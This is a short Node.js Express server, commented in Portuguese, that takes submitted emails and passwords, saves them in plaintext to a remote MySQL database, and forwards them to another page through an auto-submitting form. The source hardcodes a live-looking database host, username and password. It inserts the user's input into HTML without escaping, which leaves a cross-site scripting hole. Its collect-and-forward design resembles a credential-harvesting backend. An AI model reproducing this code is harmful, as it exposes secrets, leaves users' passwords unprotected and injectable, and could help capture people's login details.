const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql');

const app = express();
const port = process.env.PORT || 3000;

// Configurando body-parser para analisar requisições do tipo application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: false }));

// Configurando a conexão com o banco de dados MySQL
const db = mysql.createConnection({
    host: 'esi.h.filess.io',
    user: 'eudora_hatfought',
    password: '1871cc0c1003b3dab30384527bf6efb162e0fbc5',
    database: 'eudora_hatfought'
});

// Conectando ao banco de dados
db.connect((err) => {
    if (err) {
        throw err;
    }
    console.log('Conectado ao banco de dados');
});

// Rota para lidar com a submissão do formulário
app.post('/submit-form', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;
    const redirectUrl = 'http://127.0.0.1:5500/eudoraEndereco/index.html'; // Substitua pelo endereço web desejado

    const sql = 'INSERT INTO usuarios (email, password) VALUES (?, ?)';
    db.query(sql, [email, password], (err, result) => {
        if (err) {
            return res.status(500).send('Erro ao inserir dados no banco de dados');
        }

        // Redireciona o usuário para a URL especificada com os dados no corpo da requisição
        const form = `
            <form id="redirectForm" method="POST" action="${redirectUrl}">
                <input type="hidden" name="email" value="${email}" />
                <input type="hidden" name="password" value="${password}" />
            </form>
            <script type="text/javascript">
                document.getElementById('redirectForm').submit();
            </script>
        `;
        res.send(form);
    });
});

// Iniciando o servidor
app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
});

// Exporta o app do Express como um manipulador para o Vercel
module.exports = app;
